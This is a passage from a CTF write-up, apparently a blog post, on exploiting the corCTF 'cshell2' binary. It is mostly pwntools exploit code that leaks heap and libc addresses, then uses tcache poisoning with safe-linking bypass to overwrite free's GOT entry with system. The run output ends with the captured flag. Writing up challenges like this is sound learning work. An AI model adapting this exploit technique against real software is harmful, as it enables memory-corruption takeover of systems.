add(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)

delete(&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;)
edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;))

show(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;)
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
heap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; decrypt_pointer(pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1 Add&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;))) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;heap: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(heap)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# Heap state&lt;/span&gt;

&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6310	0x0000000000000000	0x0000000000000411	................ [chunk8]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6320	0x00000000013f4c0a	0x000000000000000a	.L?.............
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6330	0x000000000000000a	0x0000000000000539	........9.......
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6340	0x0000000000000000	0x0000000000000000	................
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6350	0x0000000000000000	0x0000000000000000	................
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6360	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX [chun8-&amp;gt;bio]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6370	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6380	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6390	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f63a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f63b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f63c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f63d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f63e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f63f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6400	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6410	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6420	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6430	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6440	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6450	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6460	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6470	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6480	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6490	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f64a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f64b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f64c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f64d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f64e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f64f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6500	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6510	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6520	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6530	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6540	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6550	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6560	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6570	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6580	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6590	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f65a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f65b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f65c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f65d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f65e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f65f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6600	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6610	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6620	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6630	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6640	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6650	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6660	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6670	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6680	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6690	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f66a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f66b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f66c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f66d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f66e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f66f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6700	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6710	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6720	0x5858585858585858	0x0a58585858585858	XXXXXXXXXXXXXXX.
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x13f6730	0x00000000013f4ce6	0xdc8340f7dfc0b0e1	.L?..........@..	 &amp;lt;-- tcachebins[0x410][0/7] [chunk9]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then here we are, we leaked both libc and heap base addresses. We just have to to tcache poisoning on &lt;code&gt;free&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;tcache-poisoning--profit&#34;&gt;Tcache poisoning + PROFIT&lt;/h2&gt;
&lt;p&gt;We overflow the &lt;code&gt;8&lt;/code&gt;-th chunk to overwrite the next freepointer of &lt;code&gt;chunk9&lt;/code&gt; that is stored at the HEAD of the &lt;code&gt;0x410&lt;/code&gt; tcachebin. Then we got an arbitrary write.
We craft a nice header to be able to request it back from the tcache, and we encrypt the &lt;code&gt;next&lt;/code&gt; with the location of the &lt;code&gt;chunk9&lt;/code&gt; to pass safe-linking checks.&lt;/p&gt;
&lt;p&gt;Given we hiijack GOT we initialized properly some pointers around to avoid segfaults. We do not get a write into the GOT entry of &lt;code&gt;free&lt;/code&gt; cause it is unaliagned and &lt;code&gt;malloc&lt;/code&gt; needs &lt;code&gt;16&lt;/code&gt; bytes aligned next free pointer.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x411&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(((heap &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2730&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (exe&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;free &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;)))

&lt;span style=&#34;color:#75715e&#34;&gt;# dumb&lt;/span&gt;
add(&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)

io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;5 re-age user&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;index: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, str(&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter size (1032 minimum): &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, str(&lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input firstname: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xbbdf80&lt;/span&gt;))
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input middlename: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system))
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input lastname: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x71ab0&lt;/span&gt;))
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input age: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, str(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input bio: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4cb40&lt;/span&gt;))

&lt;span style=&#34;color:#75715e&#34;&gt;# Finally&lt;/span&gt;

delete(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cat flag.txt&amp;#34;&lt;/span&gt;)
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here we are:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nasm@off:~/Documents/pwn/corCTF/cshell2$ python3 exploit.py REMOTE HOST=be.ax PORT=31667
[*] &#39;/home/nasm/Documents/pwn/corCTF/cshell2/cshell2&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fb000)
    RUNPATH:  b&#39;.&#39;
[*] &#39;/home/nasm/Documents/pwn/corCTF/cshell2/libc.so.6&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to be.ax on port 31667: Done
[*] libc: 0x7f1d388db000
[*] heap: 0x665000
[*] flag: b&#39;corctf{m0nk3y1ng_0n_4_d3bugg3r_15_th3_b35T!!!}\n&#39;
[*] Switching to interactive mode
$
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;appendices&#34;&gt;Appendices&lt;/h2&gt;
&lt;p&gt;Final exploit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# this exploit was generated via&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 1) pwntools&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 2) ctfmate&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; time
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pwn


&lt;span style=&#34;color:#75715e&#34;&gt;# Set up pwntools for the correct architecture&lt;/span&gt;
